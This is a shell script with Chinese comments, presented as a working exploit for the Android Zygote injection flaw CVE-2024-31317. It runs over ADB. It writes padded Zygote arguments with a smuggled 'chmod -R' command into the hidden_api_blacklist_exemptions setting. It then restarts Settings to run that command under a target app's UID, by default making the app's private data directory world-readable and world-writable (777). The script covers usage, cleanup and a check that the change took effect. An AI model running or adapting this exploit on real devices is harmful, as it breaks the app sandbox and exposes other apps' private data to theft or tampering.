#!/system/bin/sh

# CVE-2024-31317漏洞利用脚本 - 使用ADB修改目录权限
# 用法: chdata 包名 [权限] [user|user_de]
# 示例: chdata com.example.app
# 示例: chdata com.example.app 755
# 示例: chdata com.example.app user
# 示例: chdata com.example.app user_de 644

# 检查参数数量
if [ $# -lt 1 ] || [ $# -gt 3 ]; then
    echo "错误: 参数数量不正确"
    echo "用法: chdata 包名 [权限] [user|user_de]"
    echo "示例: chdata com.example.app"
    echo "示例: chdata com.example.app 755"
    echo "示例: chdata com.example.app user"
    echo "示例: chdata com.example.app user_de 644"
    exit 1
fi

# 提取参数
package_name="$1"

# 设置默认值
data_dir="user"  # 默认使用 /data/user/0
permission="777" # 默认权限为777

# 根据参数数量设置变量
if [ $# -eq 2 ]; then
    # 第二个参数可能是目录类型或权限
    if [ "$2" = "user" ] || [ "$2" = "user_de" ]; then
        data_dir="$2"
    elif echo "$2" | grep -qE '^[0-7]{3}$'; then
        permission="$2"
    else
        echo "错误: 第二个参数无效，必须是'user'、'user_de'或三位八进制权限数字"
        exit 1
    fi
elif [ $# -eq 3 ]; then
    # 三个参数：包名、目录类型、权限
    if [ "$2" = "user" ] || [ "$2" = "user_de" ]; then
        data_dir="$2"
    else
        echo "错误: 第二个参数必须是'user'或'user_de'"
        exit 1
    fi
    
    if echo "$3" | grep -qE '^[0-7]{3}$'; then
        permission="$3"
    else
        echo "错误: 第三个参数无效，必须是三位八进制权限数字"
        exit 1
    fi
fi

# 检查参数是否为空
if [ -z "$package_name" ]; then
    echo "错误: 包名不能为空"
    exit 1
fi

# 使用ADB和ls -lnd获取UID
echo "[+] 正在获取应用UID..."
target_dir="/data/$data_dir/0/$package_name"

# 检查目录是否存在
dir_exists=$(adb shell "ls -d $target_dir 2>/dev/null" | wc -l)
if [ "$dir_exists" -eq 0 ]; then
    echo "❌ 目标目录不存在: $target_dir"
    echo "⚠️ 可能原因: 应用未安装或使用不同的数据目录"
    exit 1
fi

# 获取目录信息并提取UID
dir_info=$(adb shell "ls -lnd $target_dir" 2>/dev/null)
if [ $? -ne 0 ]; then
    echo "❌ 无法读取目录信息: $target_dir"
    echo "⚠️ 可能原因: 权限不足或目录不存在"
    exit 1
fi

# 从目录信息中提取UID（第3个字段）
uid=$(echo "$dir_info" | awk '{print $3}')

# 检查是否成功获取到UID
if [ -z "$uid" ]; then
    echo "❌ UID获取失败"
    echo "⚠️ 可能原因: 无法解析目录信息"
    exit 1
fi

gid="$uid"  # gid = uid

echo "[+] 包名: $package_name"
echo "[+] UID: $uid"
echo "[+] 数据目录: /data/$data_dir/0/"
echo "[+] 权限: $permission"

# 创建payload内容 - 在前面添加6个换行符
payload_content="




10
--setuid=$uid
--setgid=$gid
--setgroups=9997
--mount-external-full
--runtime-args
--seinfo=platform:privapp:targetSdkVersion=30:complete
--runtime-flags=1
--nice-name=zYg0te
--invoke-with
chmod -R $permission /data/$data_dir/0/$package_name; #
,,,,X"

# 创建sdcard上的tmp目录（如果不存在）
adb shell "mkdir -p /sdcard/tmp" >/dev/null 2>&1

# 将payload写入临时文件
temp_file="/sdcard/tmp/payload_$$.txt"
echo "$payload_content" > payload_temp.txt
adb push payload_temp.txt "$temp_file" >/dev/null 2>&1
rm -f payload_temp.txt

if [ $? -ne 0 ]; then
    echo "❌ 无法创建payload文件"
    exit 1
fi

# 将payload文件复制到/data/local/tmp
adb shell "cp $temp_file /data/local/tmp/payload.txt" >/dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "❌ 无法复制payload文件到系统目录"
    adb shell "rm -f $temp_file" >/dev/null 2>&1
    exit 1
fi

# 执行漏洞利用
echo "[+] 正在执行漏洞利用..."
adb shell "am force-stop com.android.settings" >/dev/null 2>&1
adb shell "cd /data/local/tmp && settings put global hidden_api_blacklist_exemptions \"\$(cat payload.txt)\"" >/dev/null 2>&1
adb shell "am start -n com.android.settings/.Settings" >/dev/null 2>&1

# 等待命令执行
sleep 3

# 清理：将豁免设置重置为null
adb shell "settings put global hidden_api_blacklist_exemptions null" >/dev/null 2>&1

# 再次停止设置应用
adb shell "am force-stop com.android.settings" >/dev/null 2>&1

# 清理临时文件
adb shell "rm -f /data/local/tmp/payload.txt $temp_file" >/dev/null 2>&1

# 验证结果
echo "[+] 验证权限修改结果..."
echo "[+] 目标目录: $target_dir"
adb shell "ls -ld $target_dir"

# 获取当前权限并转换为数字格式
current_perms=$(adb shell "ls -ld $target_dir" | awk '{print $1}')
# 提取权限部分（忽略第一个字符d）
perm_str=$(echo "$current_perms" | cut -c2-10)

# 将权限字符串转换为数字
convert_perm_to_num() {
    local perm_str="$1"
    local result=""
    
    # 分成三组，每组三个字符
    for i in 0 3 6; do
        local group=$(echo "$perm_str" | cut -c$((i+1))-$((i+3)))
        local value=0
        
        # 检查每个权限位
        if echo "$group" | grep -q "r"; then
            value=$((value + 4))
        fi
        if echo "$group" | grep -q "w"; then
            value=$((value + 2))
        fi
        if echo "$group" | grep -q "x"; then
            value=$((value + 1))
        fi
        
        result="${result}${value}"
    done
    
    echo "$result"
}

current_perm_num=$(convert_perm_to_num "$perm_str")

echo "[+] 当前权限数字表示: $current_perm_num"
echo "[+] 期望权限数字表示: $permission"

# 比较权限
if [ "$current_perm_num" = "$permission" ]; then
    echo "✅ 权限修改成功: $current_perms ($current_perm_num)"
else
    echo "❌ 权限未按预期修改"
    echo "   当前权限: $current_perms ($current_perm_num)"
    echo "   期望权限: $permission"
fi

echo "[+] 操作完成"